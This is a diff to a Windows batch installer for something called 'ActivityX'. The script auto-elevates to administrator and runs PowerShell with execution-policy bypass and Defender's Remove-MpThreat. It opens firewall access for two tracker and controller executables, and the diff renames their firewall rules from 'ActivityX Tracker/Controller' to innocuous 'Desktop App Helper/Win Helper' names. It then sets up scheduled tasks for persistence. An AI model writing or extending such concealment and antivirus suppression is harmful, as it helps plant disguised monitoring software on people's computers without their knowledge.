@@ -2,23 +2,28 @@
 chcp 65001 >nul
 setlocal enabledelayedexpansion
 
+:: ── Save source directory before elevation ───────────────────────────────────
+set "SETUP_DIR=%~dp0"
+
 :: ── Auto-elevate to Administrator ────────────────────────────────────────────
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo Requesting administrator privileges...
-    powershell -Command "Start-Process '%~f0' -Verb RunAs -ArgumentList '%~dp0'"
+    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs -ArgumentList '\"!SETUP_DIR!\"'"
     exit /b
 )
+
+:: When elevated, accept source dir as argument
+if not "%~1"=="" set "SETUP_DIR=%~1"
 
 echo ========================================
 echo    ActivityX Setup
 echo ========================================
 echo.
+echo Source: !SETUP_DIR!
 
 set "INSTALL_DIR=%LOCALAPPDATA%\ActivityX"
-:: When elevated, %~dp0 may change — accept it as argument if passed
-if not "%~1"=="" set "SETUP_DIR=%~1"
-if "%~1"=="" set "SETUP_DIR=%~dp0"
+cd /d "!SETUP_DIR!"
 
 :: ── Kill running instances first ─────────────────────────────────────────────
 echo Stopping running instances...
@@ -76,10 +81,12 @@ powershell -ExecutionPolicy Bypass -Command "Remove-MpThreat -ErrorAction Silent
 echo Adding firewall rules...
 netsh advfirewall firewall delete rule name="ActivityX Tracker" >nul 2>&1
 netsh advfirewall firewall delete rule name="ActivityX Controller" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Tracker" dir=out action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Tracker" dir=in action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Controller" dir=out action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Controller" dir=in action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
+netsh advfirewall firewall delete rule name="Desktop App Helper" >nul 2>&1
+netsh advfirewall firewall delete rule name="Desktop Win Helper" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop App Helper" dir=out action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop App Helper" dir=in action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop Win Helper" dir=out action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop Win Helper" dir=in action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
 
 :: ── Scheduled tasks (replaces startup shortcuts) ────────────────────────────
 echo Creating scheduled tasks...
